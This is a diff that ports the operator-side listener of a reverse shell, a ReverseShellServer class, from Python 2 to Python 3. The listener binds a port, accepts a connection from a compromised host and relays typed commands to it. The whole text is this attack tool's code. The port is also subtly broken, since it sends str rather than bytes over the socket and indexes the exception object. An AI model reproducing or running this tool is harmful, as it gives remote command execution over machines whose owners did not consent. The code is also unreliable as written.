@@ -22,42 +22,42 @@ class ReverseShellServer:
 
     def bind(self, current_try=0):
         try:
-            print "listening on port %s (attempt %d)" % (self.port, current_try)
+            print("listening on port %s (attempt %d)" % (self.port, current_try))
             self.s.bind((self.host, self.port))
             self.s.listen(1)
         except socket.error as msg:
-            print >> sys.stderr, 'socket binding error:', msg[0]
+            print('socket binding error:', msg[0], file=sys.stderr)
             if current_try < self.max_bind_retries: 
-                print >> sys.stderr, 'retrying...'
+                print('retrying...', file=sys.stderr)
                 self.bind(current_try + 1)
 
     def accept(self):
         try:
             self.conn, self.addr = self.s.accept()
-            print '[!] session opened at %s:%s' % (self.addr[0], self.addr[1])
+            print('[!] session opened at %s:%s' % (self.addr[0], self.addr[1]))
             self.hostname = self.conn.recv(1024)
             self.menu()
         except socket.error as msg:
-            print >> sys.stderr, 'socket accepting error:', msg[0]
+            print('socket accepting error:', msg[0], file=sys.stderr)
 
     def menu(self):
         while True:
-            cmd = raw_input(str(self.addr[0]) + '@' + str(self.hostname) + '> ')
+            cmd = input(str(self.addr[0]) + '@' + str(self.hostname) + '> ')
             if cmd == 'quit':
                 self.conn.close()
                 self.s.close()
                 return
             command = self.conn.send(cmd)
             result = self.conn.recv(16834)
-            if result <> self.hostname:
-                print result
+            if result != self.hostname:
+                print(result)
 
 def main(args):
     server = ReverseShellServer()
     server.create(args.port)
     server.bind()
     server.accept()
-    print '[*] returned from socketAccept'
+    print('[*] returned from socketAccept')
     return 0
 
 if __name__ == '__main__':
